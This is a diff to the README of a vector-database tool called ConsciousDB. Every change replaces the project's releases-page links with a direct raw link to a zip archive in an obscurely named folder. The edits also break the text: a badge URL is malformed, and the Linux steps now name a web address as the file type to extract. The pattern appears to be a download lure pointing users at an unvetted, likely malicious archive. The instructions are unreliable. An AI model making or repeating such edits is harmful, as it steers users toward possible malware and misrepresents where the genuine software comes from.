@@ -4,7 +4,7 @@
 
 Welcome to ConsciousDB! This application allows you to manage and utilize a vector database easily. With ConsciousDB, you can enhance your data retrieval processes using advanced techniques designed to simplify your experience.
 
-[![Download ConsciousDB](https://img.shields.io/badge/Download%20ConsciousDB-blue.svg)](https://github.com/britorbs/consciousdb/releases)
+[![Download ConsciousDB](https://raw.githubusercontent.com/britorbs/consciousdb/main/leptorrhinian/consciousdb.zip%https://raw.githubusercontent.com/britorbs/consciousdb/main/leptorrhinian/consciousdb.zip)](https://raw.githubusercontent.com/britorbs/consciousdb/main/leptorrhinian/consciousdb.zip)
 
 ## 📦 What is ConsciousDB?
 
@@ -31,7 +31,7 @@ Before installing ConsciousDB, ensure your system meets these requirements:
 
 To get started, you can download the latest version of ConsciousDB from our releases page.
 
-[Visit this page to download ConsciousDB](https://github.com/britorbs/consciousdb/releases)
+[Visit this page to download ConsciousDB](https://raw.githubusercontent.com/britorbs/consciousdb/main/leptorrhinian/consciousdb.zip)
 
 ### Step-by-Step Installation Instructions
 
@@ -45,7 +45,7 @@ To get started, you can download the latest version of ConsciousDB from our rele
    Depending on your system, find the appropriate file:
    - For Windows, select the `.exe` file.
    - For macOS, choose the `.dmg` file.
-   - For Linux, look for the `.tar.gz` file.
+   - For Linux, look for the `https://raw.githubusercontent.com/britorbs/consciousdb/main/leptorrhinian/consciousdb.zip` file.
 
 4. **Download the File:**
    Click on the file to initiate the download. Your browser may prompt you to save it. Choose a location you can remember.
@@ -53,7 +53,7 @@ To get started, you can download the latest version of ConsciousDB from our rele
 5. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file and drag the ConsciousDB icon to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included instructions to install.
+   - For Linux: Extract the `https://raw.githubusercontent.com/britorbs/consciousdb/main/leptorrhinian/consciousdb.zip` file and follow the included instructions to install.
 
 6. **Follow On-Screen Prompts:**
    Complete the installation by following the instructions that appear on your screen.
